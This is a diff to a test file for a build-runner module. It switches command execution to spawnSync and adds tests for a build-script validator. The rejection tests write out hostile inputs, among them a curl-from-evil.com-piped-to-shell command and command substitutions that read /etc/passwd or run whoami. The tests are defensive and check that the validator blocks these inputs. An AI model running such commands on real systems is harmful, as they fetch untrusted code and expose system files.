@@ -1,7 +1,7 @@
 /**
  * Build Runner Module Tests
  *
- * Tests for build script execution and build pipeline.
+ * Tests for build script execution, validation, and build pipeline.
  */
 
 import { describe, it, expect, vi, beforeEach } from 'vitest';
@@ -9,12 +9,13 @@ import {
   runBuildScript,
   shouldRunBuild,
   runBuildPipeline,
+  validateBuildScript,
 } from './build-runner.js';
 
 // Mock child_process
-const mockExecSync = vi.fn();
+const mockSpawnSync = vi.fn(() => ({ status: 0, error: null }));
 vi.mock('node:child_process', () => ({
-  execSync: (...args: any[]) => mockExecSync(...args),
+  spawnSync: (...args: any[]) => mockSpawnSync(...args),
 }));
 
 // Mock output module
@@ -38,6 +39,108 @@ describe('build-runner', () => {
     vi.clearAllMocks();
   });
 
+  describe('validateBuildScript', () => {
+    describe('valid scripts', () => {
+      it('should accept npm run commands', () => {
+        expect(validateBuildScript('npm run build')).toEqual({ valid: true });
+        expect(validateBuildScript('npm run test:unit')).toEqual({ valid: true });
+      });
+
+      it('should accept npx commands', () => {
+        expect(validateBuildScript('npx tsc')).toEqual({ valid: true });
+        expect(validateBuildScript('npx style-dictionary build')).toEqual({ valid: true });
+      });
+
+      it('should accept yarn and pnpm commands', () => {
+        expect(validateBuildScript('yarn build')).toEqual({ valid: true });
+        expect(validateBuildScript('pnpm run build')).toEqual({ valid: true });
+      });
+
+      it('should accept node commands', () => {
+        expect(validateBuildScript('node scripts/build.js')).toEqual({ valid: true });
+      });
+
+      it('should accept local scripts', () => {
+        expect(validateBuildScript('./build.sh')).toEqual({ valid: true });
+      });
+
+      it('should accept make commands', () => {
+        expect(validateBuildScript('make')).toEqual({ valid: true });
+        expect(validateBuildScript('make build')).toEqual({ valid: true });
+      });
+    });
+
+    describe('dangerous patterns', () => {
+      it('should reject command substitution with $()', () => {
+        const result = validateBuildScript('npm run $(cat /etc/passwd)');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('dangerous pattern');
+      });
+
+      it('should reject command substitution with backticks', () => {
+        const result = validateBuildScript('npm run `cat /etc/passwd`');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('dangerous pattern');
+      });
+
+      it('should reject variable expansion', () => {
+        const result = validateBuildScript('npm run ${HOME}');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('dangerous pattern');
+      });
+
+      it('should reject piping curl to shell', () => {
+        const result = validateBuildScript('curl http://evil.com/script.sh | sh');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('dangerous pattern');
+      });
+
+      it('should reject eval', () => {
+        const result = validateBuildScript('eval "malicious code"');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('dangerous pattern');
+      });
+    });
+
+    describe('unrecognized commands', () => {
+      it('should reject arbitrary commands', () => {
+        const result = validateBuildScript('cat /etc/passwd');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('must start with a recognized command');
+      });
+
+      it('should reject raw shell commands', () => {
+        const result = validateBuildScript('ls -la');
+        expect(result.valid).toBe(false);
+        expect(result.error).toContain('must start with a recognized command');
+      });
+    });
+
+    describe('invalid input types', () => {
+      it('should reject non-string input', () => {
+        expect(validateBuildScript(123)).toEqual({
+          valid: false,
+          error: 'Build script must be a string',
+        });
+        expect(validateBuildScript(null)).toEqual({
+          valid: false,
+          error: 'Build script must be a string',
+        });
+      });
+
+      it('should reject empty strings', () => {
+        expect(validateBuildScript('')).toEqual({
+          valid: false,
+          error: 'Build script cannot be empty',
+        });
+        expect(validateBuildScript('   ')).toEqual({
+          valid: false,
+          error: 'Build script cannot be empty',
+        });
+      });
+    });
+  });
+
   describe('runBuildScript', () => {
     it('should return ran:false when no script configured', async () => {
       const config = { build: {} };
@@ -49,21 +152,56 @@ describe('build-runner', () => {
       expect(result.success).toBe(true);
     });
 
-    it('should execute script when configured', async () => {
+    it('should execute valid script when configured', async () => {
+      mockSpawnSync.mockReturnValueOnce({ status: 0, error: null });
+
       const config = { build: { script: 'npm run build' } };
       const mockSpinner = { text: '' };
 
       const result = await runBuildScript(config as any, mockSpinner as any);
 
-      expect(mockExecSync).toHaveBeenCalledWith('npm run build', expect.any(Object));
+      expect(mockSpawnSync).toHaveBeenCalled();
       expect(result.ran).toBe(true);
       expect(result.success).toBe(true);
     });
 
+    it('should reject invalid scripts without executing', async () => {
+      const config = { build: { script: 'cat /etc/passwd' } };
+      const mockSpinner = { text: '', fail: vi.fn() };
+
+      const result = await runBuildScript(config as any, mockSpinner as any);
+
+      expect(mockSpawnSync).not.toHaveBeenCalled();
+      expect(result.ran).toBe(false);
+      expect(result.success).toBe(false);
+      expect(mockSpinner.fail).toHaveBeenCalled();
+    });
+
+    it('should reject scripts with dangerous patterns', async () => {
+      const config = { build: { script: 'npm run $(whoami)' } };
+      const mockSpinner = { text: '', fail: vi.fn() };
+
+      const result = await runBuildScript(config as any, mockSpinner as any);
+
+      expect(mockSpawnSync).not.toHaveBeenCalled();
+      expect(result.ran).toBe(false);
+      expect(result.success).toBe(false);
+    });
+
     it('should return success:false when script fails', async () => {
-      mockExecSync.mockImplementationOnce(() => {
-        throw new Error('Build failed');
-      });
+      mockSpawnSync.mockReturnValueOnce({ status: 1, error: null });
+
+      const config = { build: { script: 'npm run build' } };
+      const mockSpinner = { text: '', fail: vi.fn() };
+
+      const result = await runBuildScript(config as any, mockSpinner as any);
+
+      expect(result.ran).toBe(true);
+      expect(result.success).toBe(false);
+    });
+
+    it('should return success:false when spawn throws error', async () => {
+      mockSpawnSync.mockReturnValueOnce({ status: null, error: new Error('Spawn failed') });
 
       const config = { build: { script: 'npm run build' } };
       const mockSpinner = { text: '', fail: vi.fn() };
